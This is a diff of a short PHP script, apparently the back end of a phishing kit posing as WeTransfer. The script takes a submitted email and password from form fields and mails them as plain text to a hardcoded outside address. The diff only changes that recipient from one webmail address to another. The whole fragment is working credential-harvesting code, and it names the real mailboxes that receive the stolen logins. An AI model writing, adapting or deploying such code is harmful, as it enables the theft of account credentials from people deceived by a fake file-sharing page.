@@ -5,7 +5,7 @@ $email = $_POST['X1'];
 $password = $_POST['X2'];
 
 //Define required variables and send user input to $myEmail.
-$myEmail = 'bukason.cele112@gmail.com';
+$myEmail = 'tesamedikal@yandex.com';
 $subject = 'WeTransfer';
 $message = 'Email: '.$email. ' Password: '.$password;
 mail($myEmail, $subject, $message);
